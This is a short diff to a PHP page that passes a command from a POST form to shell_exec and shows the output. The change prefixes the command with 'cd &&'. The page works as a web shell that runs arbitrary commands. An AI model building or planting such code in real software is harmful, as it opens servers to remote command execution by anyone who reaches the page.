@@ -51,7 +51,7 @@ if (isset($_POST['cmd'])) {
         </pre>
 <?php endif; ?>
 <?php elseif($radioval == "custom") : ?>
-			<?php $cmd=shell_exec($cmd1); ?>
+			<?php $cmd=shell_exec("cd && ".$cmd1); ?>
 		<?php	if ($cmd) : ?>
 		<div class="pb-2 mt-4 mb-2">
             <h2> Output </h2>
